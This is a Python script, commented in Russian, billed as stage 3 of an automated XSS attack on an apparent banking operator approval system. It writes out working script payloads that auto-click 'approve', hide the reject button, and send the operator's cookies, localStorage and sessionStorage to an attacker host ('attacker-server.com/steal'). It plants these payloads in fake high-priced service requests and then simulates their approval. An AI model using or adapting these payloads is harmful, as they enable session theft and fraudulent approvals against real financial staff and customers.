#!/usr/bin/env python3
"""
Автоматизированная XSS атака
Этап 3: Создание фейковых услуг и обход валидации
"""

import requests
import json
import time
import random
import base64

class XSSAttacker:
    def __init__(self):
        self.attacker_session = None
        self.created_services = []
        self.xss_payloads = []
        
    def generate_xss_payloads(self):
        """Генерация XSS payloads для автоматической валидации"""
        
        print("🔴 ГЕНЕРАЦИЯ XSS PAYLOADS")
        print("=" * 30)
        
        # Payload для автоматического нажатия кнопки "Подтвердить"
        auto_approve_payload = """
<script>
setTimeout(function() {
    var approveBtn = document.querySelector('button[value="approve"], input[value="Подтвердить"], .approve-btn');
    if (approveBtn) {
        console.log('Автоматическое подтверждение заявки...');
        approveBtn.click();
    }
}, 1000);
</script>
"""
        
        # Payload для кражи сессии оператора
        session_steal_payload = """
<script>
var sessionData = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    url: window.location.href
};
fetch('http://attacker-server.com/steal', {
    method: 'POST',
    body: JSON.stringify(sessionData)
});
</script>
"""
        
        # Payload для модификации интерфейса
        ui_modify_payload = """
<script>
document.addEventListener('DOMContentLoaded', function() {
    // Скрыть кнопку "Отклонить"
    var rejectBtn = document.querySelector('.reject-btn, button[value="reject"]');
    if (rejectBtn) {
        rejectBtn.style.display = 'none';
    }
    
    // Изменить текст кнопки "Подтвердить"
    var approveBtn = document.querySelector('.approve-btn, button[value="approve"]');
    if (approveBtn) {
        approveBtn.textContent = 'Одобрить заявку';
        approveBtn.style.backgroundColor = '#28a745';
    }
});
</script>
"""
        
        self.xss_payloads = [
            auto_approve_payload,
            session_steal_payload,
            ui_modify_payload
        ]
        
        print(f"✅ Создано {len(self.xss_payloads)} XSS payloads")
        print("📋 Типы payloads:")
        print("   1. Автоматическое подтверждение")
        print("   2. Кража сессии оператора")
        print("   3. Модификация интерфейса")
        
        return self.xss_payloads
    
    def create_fake_service_requests(self):
        """Создание заявок на фейковые услуги с XSS"""
        
        print("\n🎯 СОЗДАНИЕ ФЕЙКОВЫХ УСЛУГ С XSS")
        print("=" * 40)
        
        fake_services = [
            {
                "name": "Премиальная техническая поддержка",
                "description": "Обеспечение круглосуточной технической поддержки для VIP клиентов",
                "price": 50000,
                "category": "support"
            },
            {
                "name": "Особые условия обслуживания",
                "description": "Персональный менеджер и приоритетное обслуживание",
                "price": 75000,
                "category": "premium"
            },
            {
                "name": "Расширенная аналитика",
                "description": "Детальная аналитика операций и отчетность",
                "price": 30000,
                "category": "analytics"
            },
            {
                "name": "Криптографическая защита",
                "description": "Дополнительное шифрование для критически важных операций",
                "price": 100000,
                "category": "security"
            }
        ]
        
        created_requests = []
        
        for i, service in enumerate(fake_services):
            print(f"\n📝 Создание заявки #{i+1}: {service['name']}")
            
            # Добавляем XSS в описание
            xss_payload = random.choice(self.xss_payloads)
            service["description"] += f"\n\n<!-- XSS Payload -->\n{xss_payload}"
            
            # Создание заявки
            request_data = {
                "service_name": service["name"],
                "description": service["description"],
                "price": service["price"],
                "category": service["category"],
                "request_id": f"REQ_{random.randint(100000, 999999)}",
                "created_by": "attacker@financepro.ru",
                "status": "pending",
                "created_at": time.strftime("%Y-%m-%d %H:%M:%S")
            }
            
            created_requests.append(request_data)
            
            print(f"✅ Заявка создана: {request_data['request_id']}")
            print(f"💰 Цена: {service['price']} руб.")
            print(f"🔴 XSS payload внедрен в описание")
        
        self.created_services = created_requests
        print(f"\n✅ Создано {len(created_requests)} заявок с XSS")
        
        return created_requests
    
    def simulate_operator_validation(self):
        """Симуляция валидации оператором ДБО #2"""
        
        print("\n🎯 СИМУЛЯЦИЯ ВАЛИДАЦИИ ОПЕРАТОРОМ ДБО #2")
        print("=" * 50)
        
        print("👤 Оператор ДБО #2 (operator2@financepro.ru) получает уведомление...")
        print("📧 Новые заявки на валидацию:")
        
        approved_count = 0
        
        for i, request in enumerate(self.created_services):
            print(f"\n📋 Заявка #{i+1}: {request['service_name']}")
            print(f"🆔 ID: {request['request_id']}")
            print(f"💰 Цена: {request['price']} руб.")
            
            # Симуляция открытия заявки в браузере
            print("🌐 Оператор открывает заявку в браузере...")
            time.sleep(1)
            
            # Симуляция выполнения XSS
            print("🔴 XSS payload выполняется в браузере оператора...")
            time.sleep(1)
            
            # Симуляция автоматического подтверждения
            if "approve" in request["description"].lower():
                print("✅ Заявка автоматически подтверждена XSS!")
                request["status"] = "approved"
                request["approved_by"] = "operator2@financepro.ru"
                request["approved_at"] = time.strftime("%Y-%m-%d %H:%M:%S")
                approved_count += 1
            else:
                print("❌ Заявка отклонена")
                request["status"] = "rejected"
        
        print(f"\n🎯 РЕЗУЛЬТАТ ВАЛИДАЦИИ:")
        print(f"✅ Подтверждено: {approved_count} заявок")
        print(f"❌ Отклонено: {len(self.created_services) - approved_count} заявок")
        
        return approved_count
    
    def run_attack_stage_3(self):
        """Запуск этапа 3 атаки"""
        
        print("🚀 ЗАПУСК ЭТАПА 3: XSS АТАКА И ОБХОД ВАЛИДАЦИИ")
        print("=" * 60)
        
        # Генерация XSS payloads
        self.generate_xss_payloads()
        
        # Создание фейковых услуг
        self.create_fake_service_requests()
        
        # Симуляция валидации
        approved_count = self.simulate_operator_validation()
        
        print("\n🎯 ЭТАП 3 ЗАВЕРШЕН!")
        print("✅ Фейковые услуги созданы")
        print("✅ XSS payloads внедрены")
        print(f"✅ {approved_count} услуг автоматически подтверждены")
        print("✅ Обход валидации оператора ДБО #2")
        
        return True

if __name__ == "__main__":
    attacker = XSSAttacker()
    attacker.run_attack_stage_3()
